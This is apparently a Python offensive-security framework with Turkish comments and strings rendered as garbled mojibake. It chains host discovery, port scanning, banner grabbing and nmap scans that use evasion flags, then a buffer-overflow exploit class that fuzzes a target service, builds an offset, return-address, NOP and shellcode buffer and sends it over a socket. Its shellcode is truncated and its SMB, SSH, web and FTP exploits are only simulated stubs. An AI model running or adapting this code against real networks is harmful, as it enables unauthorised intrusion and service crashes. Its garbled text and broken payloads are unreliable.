#!/usr/bin/env python3
"""
AÄŸ Penetrasyon Testi Framework
Author: ibrahimsql
Description: KapsamlÄ± aÄŸ penetrasyon testi araÃ§larÄ± ve teknikleri
"""

import subprocess
import json
import xml.etree.ElementTree as ET
from datetime import datetime
import ipaddress
import socket
import threading
import time
import struct
import queue
import re
import requests
import nmap
from typing import Dict, List, Optional, Any, Tuple
from concurrent.futures import ThreadPoolExecutor, as_completed

class NetworkPentestFramework:
    """AÄŸ penetrasyon testi yaÅŸam dÃ¶ngÃ¼sÃ¼ framework'Ã¼"""
    
    def __init__(self, target_network):
        self.target_network = target_network
        self.discovered_hosts = []
        self.open_ports = {}
        self.vulnerabilities = []
        self.exploited_hosts = []
        self.report_data = {
            'start_time': datetime.now().isoformat(),
            'target': target_network,
            'phases': {}
        }
    
    def phase_1_reconnaissance(self):
        """Faz 1: KeÅŸif ve Bilgi Toplama"""
        print("[+] Faz 1: Reconnaissance baÅŸlatÄ±lÄ±yor...")
        
        # Passive reconnaissance
        passive_info = self.passive_reconnaissance()
        
        # Active reconnaissance
        active_info = self.active_reconnaissance()
        
        self.report_data['phases']['reconnaissance'] = {
            'passive': passive_info,
            'active': active_info,
            'timestamp': datetime.now().isoformat()
        }
        
        return passive_info, active_info
    
    def passive_reconnaissance(self):
        """Pasif keÅŸif teknikleri"""
        info = {
            'dns_enumeration': [],
            'whois_data': {},
            'search_engine_recon': [],
            'social_media_intel': []
        }
        
        # DNS enumeration
        try:
            # DNS zone transfer attempt
            dns_servers = self.find_dns_servers()
            for dns_server in dns_servers:
                zone_data = self.attempt_zone_transfer(dns_server)
                if zone_data:
                    info['dns_enumeration'].append({
                        'server': dns_server,
                        'zone_data': zone_data
                    })
        except Exception as e:
            print(f"[-] DNS enumeration hatasÄ±: {e}")
        
        return info
    
    def active_reconnaissance(self):
        """Aktif keÅŸif teknikleri"""
        info = {
            'host_discovery': [],
            'port_scanning': {},
            'service_enumeration': {},
            'os_fingerprinting': {}
        }
        
        # Host discovery
        self.discovered_hosts = self.discover_hosts()
        info['host_discovery'] = self.discovered_hosts
        
        # Port scanning for each discovered host
        for host in self.discovered_hosts:
            ports = self.port_scan(host)
            self.open_ports[host] = ports
            info['port_scanning'][host] = ports
            
            # Service enumeration
            services = self.enumerate_services(host, ports)
            info['service_enumeration'][host] = services
            
            # OS fingerprinting
            os_info = self.os_fingerprint(host)
            info['os_fingerprinting'][host] = os_info
        
        return info
    
    def discover_hosts(self):
        """AÄŸdaki aktif hostlarÄ± keÅŸfet"""
        hosts = []
        network = ipaddress.ip_network(self.target_network, strict=False)
        
        print(f"[+] {network} aÄŸÄ±nda host keÅŸfi yapÄ±lÄ±yor...")
        
        # Ping sweep
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = {executor.submit(self.ping_host, str(ip)): str(ip) for ip in network.hosts()}
            
            for future in as_completed(futures):
                ip = futures[future]
                try:
                    if future.result():
                        hosts.append(ip)
                        print(f"[+] Aktif host bulundu: {ip}")
                except Exception as e:
                    print(f"[-] {ip} ping hatasÄ±: {e}")
        
        return hosts
    
    def ping_host(self, host):
        """Host'un aktif olup olmadÄ±ÄŸÄ±nÄ± kontrol et"""
        try:
            result = subprocess.run(
                ['ping', '-c', '1', '-W', '1000', host],
                capture_output=True,
                text=True,
                timeout=2
            )
            return result.returncode == 0
        except:
            return False
    
    def port_scan(self, host):
        """Belirtilen host'ta port taramasÄ± yap"""
        open_ports = []
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 993, 995, 1723, 3306, 3389, 5432, 5900, 8080]
        
        print(f"[+] {host} iÃ§in port taramasÄ± yapÄ±lÄ±yor...")
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(self.check_port, host, port): port for port in common_ports}
            
            for future in as_completed(futures):
                port = futures[future]
                try:
                    if future.result():
                        open_ports.append(port)
                        print(f"[+] AÃ§Ä±k port bulundu: {host}:{port}")
                except Exception as e:
                    print(f"[-] {host}:{port} tarama hatasÄ±: {e}")
        
        return sorted(open_ports)
    
    def check_port(self, host, port):
        """Belirtilen port'un aÃ§Ä±k olup olmadÄ±ÄŸÄ±nÄ± kontrol et"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except:
            return False
    
    def enumerate_services(self, host, ports):
        """AÃ§Ä±k portlardaki servisleri enumerate et"""
        services = {}
        
        for port in ports:
            try:
                service_info = self.banner_grab(host, port)
                services[port] = service_info
            except Exception as e:
                services[port] = {'error': str(e)}
        
        return services
    
    def banner_grab(self, host, port):
        """Banner grabbing ile servis bilgisi al"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((host, port))
            
            # HTTP servisleri iÃ§in Ã¶zel istek
            if port in [80, 443, 8080, 8443]:
                sock.send(b"GET / HTTP/1.1\r\nHost: " + host.encode() + b"\r\n\r\n")
            else:
                sock.send(b"\r\n")
            
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            sock.close()
            
            return {
                'banner': banner.strip(),
                'service': self.identify_service(port, banner)
            }
        except Exception as e:
            return {'error': str(e)}
    
    def identify_service(self, port, banner):
        """Port ve banner bilgisine gÃ¶re servisi tanÄ±mla"""
        common_services = {
            21: 'FTP',
            22: 'SSH',
            23: 'Telnet',
            25: 'SMTP',
            53: 'DNS',
            80: 'HTTP',
            110: 'POP3',
            143: 'IMAP',
            443: 'HTTPS',
            993: 'IMAPS',
            995: 'POP3S',
            3306: 'MySQL',
            3389: 'RDP',
            5432: 'PostgreSQL'
        }
        
        service = common_services.get(port, 'Unknown')
        
        # Banner'dan daha spesifik bilgi Ã§Ä±kar
        if 'apache' in banner.lower():
            service += ' (Apache)'
        elif 'nginx' in banner.lower():
            service += ' (Nginx)'
        elif 'microsoft' in banner.lower():
            service += ' (Microsoft)'
        
        return service
    
    def os_fingerprint(self, host):
        """Ä°ÅŸletim sistemi parmak izi alma"""
        try:
            # TTL deÄŸeri ile basit OS detection
            result = subprocess.run(
                ['ping', '-c', '1', host],
                capture_output=True,
                text=True,
                timeout=5
            )
            
            if 'ttl=' in result.stdout.lower():
                ttl_match = re.search(r'ttl=(\d+)', result.stdout.lower())
                if ttl_match:
                    ttl = int(ttl_match.group(1))
                    
                    if ttl <= 64:
                        return {'os': 'Linux/Unix', 'ttl': ttl}
                    elif ttl <= 128:
                        return {'os': 'Windows', 'ttl': ttl}
                    else:
                        return {'os': 'Unknown', 'ttl': ttl}
            
            return {'os': 'Unknown', 'ttl': None}
        except Exception as e:
            return {'error': str(e)}
    
    def find_dns_servers(self):
        """DNS sunucularÄ±nÄ± bul"""
        # Basit DNS sunucu listesi
        return ['8.8.8.8', '1.1.1.1']
    
    def attempt_zone_transfer(self, dns_server):
        """DNS zone transfer denemesi"""
        # Bu gerÃ§ek uygulamada dig komutu kullanÄ±lÄ±r
        return None

class AdvancedNmapScanner:
    """GeliÅŸmiÅŸ Nmap tarama araÃ§larÄ±"""
    
    def __init__(self):
        self.scan_results = {}
        self.scan_queue = queue.Queue()
        self.threads = []
    
    def stealth_scan(self, target):
        """Stealth SYN tarama"""
        print(f"[+] Stealth SYN tarama baÅŸlatÄ±lÄ±yor: {target}")
        
        cmd = [
            'nmap',
            '-sS',  # SYN scan
            '-T2',  # Slow timing
            '-f',   # Fragment packets
            '--randomize-hosts',
            '--data-length', '25',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def comprehensive_scan(self, target):
        """KapsamlÄ± tarama"""
        print(f"[+] KapsamlÄ± tarama baÅŸlatÄ±lÄ±yor: {target}")
        
        cmd = [
            'nmap',
            '-sS', '-sU',  # TCP SYN + UDP scan
            '-A',          # Aggressive scan
            '-T4',         # Aggressive timing
            '-p-',         # All ports
            '--script', 'default,vuln',
            '-oX', f'scan_{target.replace("/", "_")}.xml',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=1800)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def service_version_scan(self, target):
        """Servis versiyonu tarama"""
        print(f"[+] Servis versiyonu tarama: {target}")
        
        cmd = [
            'nmap',
            '-sV',         # Version detection
            '--version-intensity', '9',
            '-T4',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def os_detection_scan(self, target):
        """Ä°ÅŸletim sistemi tespit tarama"""
        print(f"[+] OS detection tarama: {target}")
        
        cmd = [
            'nmap',
            '-O',          # OS detection
            '--osscan-guess',
            '--max-os-tries', '2',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def vulnerability_scan(self, target):
        """Zafiyet tarama"""
        print(f"[+] Vulnerability tarama: {target}")
        
        cmd = [
            'nmap',
            '--script', 'vuln',
            '--script-args', 'unsafe=1',
            '-T4',
            target
        ]
        
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=900)
            return self.parse_nmap_output(result.stdout)
        except Exception as e:
            return {'error': str(e)}
    
    def parse_nmap_output(self, output):
        """Nmap Ã§Ä±ktÄ±sÄ±nÄ± parse et"""
        results = {
            'hosts': [],
            'open_ports': {},
            'services': {},
            'vulnerabilities': []
        }
        
        lines = output.split('\n')
        current_host = None
        
        for line in lines:
            line = line.strip()
            
            # Host bilgisi
            if 'Nmap scan report for' in line:
                current_host = line.split('for ')[-1].split(' ')[0]
                results['hosts'].append(current_host)
                results['open_ports'][current_host] = []
                results['services'][current_host] = {}
            
            # Port bilgisi
            elif '/tcp' in line or '/udp' in line:
                if current_host:
                    parts = line.split()
                    if len(parts) >= 3:
                        port_info = parts[0]
                        state = parts[1]
                        service = parts[2] if len(parts) > 2 else 'unknown'
                        
                        if 'open' in state:
                            port_num = port_info.split('/')[0]
                            results['open_ports'][current_host].append(int(port_num))
                            results['services'][current_host][int(port_num)] = service
        
        return results
    
    def threaded_scan(self, targets, scan_type='stealth'):
        """Ã‡oklu thread ile tarama"""
        results = {}
        
        def scan_worker(target):
            if scan_type == 'stealth':
                result = self.stealth_scan(target)
            elif scan_type == 'comprehensive':
                result = self.comprehensive_scan(target)
            elif scan_type == 'service':
                result = self.service_version_scan(target)
            else:
                result = self.vulnerability_scan(target)
            
            results[target] = result
        
        threads = []
        for target in targets:
            thread = threading.Thread(target=scan_worker, args=(target,))
            thread.start()
            threads.append(thread)
        
        # TÃ¼m thread'lerin bitmesini bekle
        for thread in threads:
            thread.join()
        
        return results

class BufferOverflowExploit:
    """Buffer overflow exploit geliÅŸtirme framework'Ã¼"""
    
    def __init__(self, target_ip, target_port):
        self.target_ip = target_ip
        self.target_port = target_port
        self.offset = 0
        self.bad_chars = []
        self.return_address = 0
        self.shellcode = b""
    
    def find_offset(self, pattern_length=1000):
        """EIP offset'ini bul"""
        print("[+] EIP offset bulunuyor...")
        
        # Basit cyclic pattern oluÅŸtur
        pattern = b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9" * (pattern_length // 60 + 1)
        pattern = pattern[:pattern_length]
        
        try:
            # Hedef servise baÄŸlan
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            
            # Pattern'i gÃ¶nder
            sock.send(pattern)
            
            # Crash'i bekle
            time.sleep(2)
            sock.close()
            
            print("[*] Servis crash oldu. EIP deÄŸerini manuel olarak kontrol edin.")
            print(f"[*] Pattern: {pattern[:100]}...")
            
        except Exception as e:
            print(f"[-] Offset bulma hatasÄ±: {e}")
    
    def set_offset(self, offset):
        """EIP offset'ini ayarla"""
        self.offset = offset
        print(f"[+] EIP offset ayarlandÄ±: {offset}")
    
    def find_bad_characters(self):
        """KÃ¶tÃ¼ karakterleri bul"""
        print("[+] KÃ¶tÃ¼ karakterler bulunuyor...")
        
        # TÃ¼m karakterleri iÃ§eren string oluÅŸtur
        all_chars = b""
        for i in range(1, 256):
            all_chars += struct.pack("B", i)
        
        # Buffer oluÅŸtur
        buffer = b"A" * self.offset
        buffer += b"BBBB"  # EIP
        buffer += all_chars
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            sock.send(buffer)
            time.sleep(2)
            sock.close()
            
            print("[*] Karakterler gÃ¶nderildi. ESP'yi manuel olarak kontrol edin.")
            print("[*] Eksik veya deÄŸiÅŸen karakterler kÃ¶tÃ¼ karakterlerdir.")
            
        except Exception as e:
            print(f"[-] KÃ¶tÃ¼ karakter bulma hatasÄ±: {e}")
    
    def set_bad_characters(self, bad_chars):
        """KÃ¶tÃ¼ karakterleri ayarla"""
        self.bad_chars = bad_chars
        print(f"[+] KÃ¶tÃ¼ karakterler ayarlandÄ±: {[hex(c) for c in bad_chars]}")
    
    def find_jmp_esp(self):
        """JMP ESP adresini bul"""
        print("[+] JMP ESP adresi bulunuyor...")
        print("[*] Mona.py veya ROPgadget kullanarak JMP ESP adresi bulun:")
        print("[*] !mona jmp -r esp -cpb \"\\x00\\x0a\\x0d\"")
        print("[*] ROPgadget --binary program.exe --only 'jmp|call' | grep esp")
    
    def set_return_address(self, address):
        """Return adresini ayarla"""
        self.return_address = address
        print(f"[+] Return adresi ayarlandÄ±: {hex(address)}")
    
    def generate_shellcode(self, payload_type='calc', lhost='192.168.1.100', lport=4444):
        """Shellcode oluÅŸtur"""
        print(f"[+] {payload_type} shellcode oluÅŸturuluyor...")
        
        if payload_type == 'calc':
            # Calc.exe shellcode (test iÃ§in)
            self.shellcode = (
                b"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
                b"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
                b"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
            )
        elif payload_type == 'reverse_shell':
            # Reverse shell shellcode placeholder
            self.shellcode = b"\x90" * 16 + b"REVERSE_SHELL_PLACEHOLDER"
        else:
            # NOP sled
            self.shellcode = b"\x90" * 100
        
        # KÃ¶tÃ¼ karakterleri kontrol et
        for bad_char in self.bad_chars:
            if bad_char in self.shellcode:
                print(f"[!] UyarÄ±: Shellcode'da kÃ¶tÃ¼ karakter bulundu: {hex(bad_char)}")
        
        print(f"[+] Shellcode oluÅŸturuldu ({len(self.shellcode)} bytes)")
    
    def create_exploit(self):
        """Final exploit'i oluÅŸtur"""
        if not all([self.offset, self.return_address, self.shellcode]):
            print("[-] Eksik parametreler! Offset, return address ve shellcode gerekli.")
            return None
        
        # Buffer oluÅŸtur
        buffer = b"A" * self.offset
        buffer += struct.pack("<L", self.return_address)  # EIP
        buffer += b"\x90" * 16  # NOP sled
        buffer += self.shellcode
        
        print(f"[+] Exploit oluÅŸturuldu ({len(buffer)} bytes)")
        return buffer
    
    def send_exploit(self, exploit_buffer):
        """Exploit'i gÃ¶nder"""
        try:
            print(f"[+] Exploit gÃ¶nderiliyor: {self.target_ip}:{self.target_port}")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.target_ip, self.target_port))
            sock.send(exploit_buffer)
            
            print("[+] Exploit gÃ¶nderildi!")
            
            # Response bekle
            try:
                response = sock.recv(1024)
                print(f"[+] Response: {response}")
            except:
                pass
            
            sock.close()
            
        except Exception as e:
            print(f"[-] Exploit gÃ¶nderme hatasÄ±: {e}")

class NetworkExploitFramework:
    """AÄŸ exploit framework'Ã¼"""
    
    def __init__(self):
        self.exploits = {
            'smb': self.smb_exploits,
            'ssh': self.ssh_exploits,
            'web': self.web_exploits,
            'ftp': self.ftp_exploits
        }
    
    def smb_exploits(self, target):
        """SMB zafiyetleri"""
        exploits = [
            'EternalBlue (MS17-010)',
            'SMBGhost (CVE-2020-0796)',
            'SMB Relay Attack'
        ]
        
        results = []
        for exploit in exploits:
            # GerÃ§ek exploit kodu burada olacak
            results.append({
                'exploit': exploit,
                'status': 'simulated',
                'target': target
            })
        
        return results
    
    def ssh_exploits(self, target):
        """SSH zafiyetleri"""
        exploits = [
            'SSH Brute Force',
            'SSH Key Enumeration',
            'SSH Version Exploits'
        ]
        
        results = []
        for exploit in exploits:
            results.append({
                'exploit': exploit,
                'status': 'simulated',
                'target': target
            })
        
        return results
    
    def web_exploits(self, target):
        """Web uygulama zafiyetleri"""
        exploits = [
            'SQL Injection',
            'XSS (Cross-Site Scripting)',
            'Directory Traversal',
            'Command Injection'
        ]
        
        results = []
        for exploit in exploits:
            results.append({
                'exploit': exploit,
                'status': 'simulated',
                'target': target
            })
        
        return results
    
    def ftp_exploits(self, target):
        """FTP zafiyetleri"""
        exploits = [
            'FTP Anonymous Login',
            'FTP Brute Force',
            'FTP Buffer Overflow'
        ]
        
        results = []
        for exploit in exploits:
            results.append({
                'exploit': exploit,
                'status': 'simulated',
                'target': target
            })
        
        return results
    
    def run_exploits(self, target, service_type):
        """Belirtilen servis tÃ¼rÃ¼ iÃ§in exploit'leri Ã§alÄ±ÅŸtÄ±r"""
        if service_type in self.exploits:
            return self.exploits[service_type](target)
        else:
            return [{'error': f'Unknown service type: {service_type}'}]

# KullanÄ±m Ã¶rnekleri
if __name__ == "__main__":
    print("ðŸ” Network Penetration Testing Framework")
    print("âš ï¸  Bu araÃ§larÄ± sadece sahip olduÄŸunuz veya izin aldÄ±ÄŸÄ±nÄ±z sistemlerde kullanÄ±n!")
    
    # Network pentest framework Ã¶rneÄŸi
    target_network = "192.168.1.0/24"
    pentest = NetworkPentestFramework(target_network)
    
    print(f"\nðŸŽ¯ Hedef aÄŸ: {target_network}")
    
    # Reconnaissance phase
    passive_info, active_info = pentest.phase_1_reconnaissance()
    
    print(f"\nðŸ“Š Bulunan hostlar: {len(pentest.discovered_hosts)}")
    for host in pentest.discovered_hosts[:5]:  # Ä°lk 5 host
        print(f"  - {host}")
    
    # Nmap scanner Ã¶rneÄŸi
    nmap_scanner = AdvancedNmapScanner()
    
    if pentest.discovered_hosts:
        target_host = pentest.discovered_hosts[0]
        print(f"\nðŸ” {target_host} iÃ§in detaylÄ± tarama...")
        
        # Stealth scan
        stealth_results = nmap_scanner.stealth_scan(target_host)
        print(f"Stealth scan tamamlandÄ±: {len(stealth_results.get('hosts', []))} host")
    
    # Buffer overflow exploit Ã¶rneÄŸi
    print("\nðŸ’¥ Buffer Overflow Exploit Framework")
    bof_exploit = BufferOverflowExploit("192.168.1.100", 9999)
    
    # Exploit parametrelerini ayarla
    bof_exploit.set_offset(1978)
    bof_exploit.set_bad_characters([0x00, 0x0a, 0x0d])
    bof_exploit.set_return_address(0x625011af)
    bof_exploit.generate_shellcode('calc')
    
    # Exploit oluÅŸtur
    exploit_buffer = bof_exploit.create_exploit()
    if exploit_buffer:
        print(f"âœ… Exploit hazÄ±r ({len(exploit_buffer)} bytes)")
    
    # Network exploit framework
    exploit_framework = NetworkExploitFramework()
    
    if pentest.discovered_hosts:
        target_host = pentest.discovered_hosts[0]
        print(f"\nðŸŽ¯ {target_host} iÃ§in exploit'ler test ediliyor...")
        
        # SMB exploits
        smb_results = exploit_framework.run_exploits(target_host, 'smb')
        print(f"SMB exploits: {len(smb_results)} test")
        
        # Web exploits
        web_results = exploit_framework.run_exploits(target_host, 'web')
        print(f"Web exploits: {len(web_results)} test")
    
    print("\nâœ… Network Penetration Testing Framework tamamlandÄ±!")
    print("ðŸ“ DetaylÄ± rapor iÃ§in log dosyalarÄ±nÄ± kontrol edin.")